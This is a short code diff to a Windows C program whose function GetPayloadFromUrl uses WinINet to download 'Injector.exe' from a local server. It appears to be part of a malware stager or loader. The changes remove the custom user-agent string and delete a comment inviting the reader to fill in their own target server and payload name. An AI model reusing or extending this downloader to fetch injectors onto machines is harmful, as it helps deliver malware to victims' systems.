@@ -15,7 +15,7 @@ BOOL GetPayloadFromUrl(LPCWSTR szUrl, PBYTE* pPayloadBytes, SIZE_T* sPayloadSize
 	PBYTE		pBytes            = NULL,
 			    pTmpBytes         = NULL;
 
-	hInternet = InternetOpenW(L"MyUserAgent", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
+	hInternet = InternetOpenW(NULL, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
 	if (hInternet == NULL) {
 		printf("[!] InternetOpenW Failed With Error : %d \n", GetLastError());
 		bSTATE = FALSE; goto _EndOfFunction;
@@ -74,7 +74,7 @@ int main(int argc, char *argv[]) {
 	PBYTE payloadBytes = NULL;
 	SIZE_T payloadSize = 0;
 
-	if (GetPayloadFromUrl(L"https://127.0.0.1:8000/Injector.exe", &payloadBytes, &payloadSize)) { // write your target server and payload name in here
+	if (GetPayloadFromUrl(L"https://127.0.0.1:8000/Injector.exe", &payloadBytes, &payloadSize)) {
 		printf("[+] Payload downloaded successfully. Size: %llu bytes.\n", payloadSize);
 		LocalFree(payloadBytes);
 	} else {
